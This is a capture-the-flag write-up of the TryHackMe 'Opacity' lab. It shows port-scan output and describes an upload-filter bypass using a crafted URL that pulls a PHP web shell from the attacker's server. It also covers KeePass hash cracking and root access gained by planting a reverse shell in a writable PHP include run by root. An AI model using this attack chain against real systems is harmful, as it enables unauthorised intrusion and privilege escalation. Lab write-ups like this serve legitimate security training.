---------------

### CTF: TRYHACKME
### Lab: Opacity

---------------

![image](https://github.com/user-attachments/assets/2d42254f-1d41-46dd-ba37-9dd96355fe30)

---------------

- Rustscan's output-:

```bash
❯ rustscan -a 10.10.173.25 -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.173.25:22
Open 10.10.173.25:80
Open 10.10.173.25:139
Open 10.10.173.25:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 21:48 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:48
Completed NSE at 21:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:48
Completed NSE at 21:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:48
Completed NSE at 21:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:48
Completed Parallel DNS resolution of 1 host. at 21:48, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:48
Scanning 10.10.173.25 [4 ports]
Discovered open port 80/tcp on 10.10.173.25
Discovered open port 22/tcp on 10.10.173.25
Discovered open port 445/tcp on 10.10.173.25
Discovered open port 139/tcp on 10.10.173.25
Completed Connect Scan at 21:48, 0.17s elapsed (4 total ports)
Initiating Service scan at 21:48
Scanning 4 services on 10.10.173.25
Completed Service scan at 21:48, 11.55s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.173.25.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:48
Completed NSE at 21:48, 6.34s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:48
Completed NSE at 21:49, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
Nmap scan report for 10.10.173.25
Host is up, received user-set (0.17s latency).
Scanned at 2024-12-08 21:48:41 WAT for 19s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-12-08T21:17:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59390/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16306/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49568/udp): CLEAN (Failed to receive data)
|   Check 4 (port 63740/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 28m08s
```
- Ffuf's output

- In route `/cloud/`, I discovered an index page that allows user to upload images via a url.After testing this functionality, I discovered that only files with `.jpg`
can be uploaded.

![image](https://github.com/user-attachments/assets/cc332704-ca7b-4869-8cb5-fb1893bee2ce)

- Although, gaining RCE with the `.jpg` will only be possible via LFI.I decided to exploit the fact that it checks if the url ends with `.jpg` by crafting a special url to download `shell.php` without the need for `.jpg` extension.As seen below, I set up a parameter to hold the jpg extension so that the url will end with `.jpg`.The python `http.server` module will only serve `shell.php` and won't do anything to the parameter passed.`%26` is the url-encoded string for `&`.

Url-:`http://[ip]:8000/shell.php%26file=shell.jpg`

![image](https://github.com/user-attachments/assets/e51dd895-7950-4451-baf8-6f3b6c8a5f28)

- Shell uploaded, I copied the shell up one directory because files in the directory gets deleted.

![image](https://github.com/user-attachments/assets/cea350b1-f78a-48c4-8b24-0e9451bc902e)

- Reverse shell-:

![image](https://github.com/user-attachments/assets/9c3db559-d814-4d8f-8022-1db772d8e3a7)

### USER `sysadmin`

- I discovered a keepass db belonging to user `sysadmin` in directory `/opt`.I dumped the hash with `keepass2john` and cracked with John the ripper.

![image](https://github.com/user-attachments/assets/cdf68bea-c8a9-4781-a7fc-503f61fbaa08)

- I recovered the password for user `sysadmin` in the database using keepassxc.

![image](https://github.com/user-attachments/assets/5fd35feb-ce9d-4d76-9dd3-0639f14ea0d6)

- User `sysadmin`-:

![image](https://github.com/user-attachments/assets/12c83d0d-6a0d-4cfb-9925-0ffa18e1cdda)

### PRIVESC with root php scripts

- In `sysadmin`'s home directory, I discovered the script responsible deleting the files in the route `cloud` subdirectory named `images`.The user has no write access but I noticed a library `backup.inc.php` which function `zipData` gets called.With write access,we can add a reverse shell line in php `system()` function to execute os command and spawn a root reverse shell since the process is run by root.After dropping into rabbit holes,I discovered that the user has write access to the `backup.inc.php` file.

![image](https://github.com/user-attachments/assets/b2adfb3f-776f-4d3c-b2fd-edd2e153c1be)

- I added a bash reverse shell.

![image](https://github.com/user-attachments/assets/f40ae920-f269-4318-8246-4bf273bad21c)

- Reverse shell spawned-:

![image](https://github.com/user-attachments/assets/aae28522-d1e0-4082-97fb-886552334b87)

- Root-:

![image](https://github.com/user-attachments/assets/75732639-62c9-4859-81d3-46ef25f1bdf9)

----------------

### THANKS FOR READING......

----------------













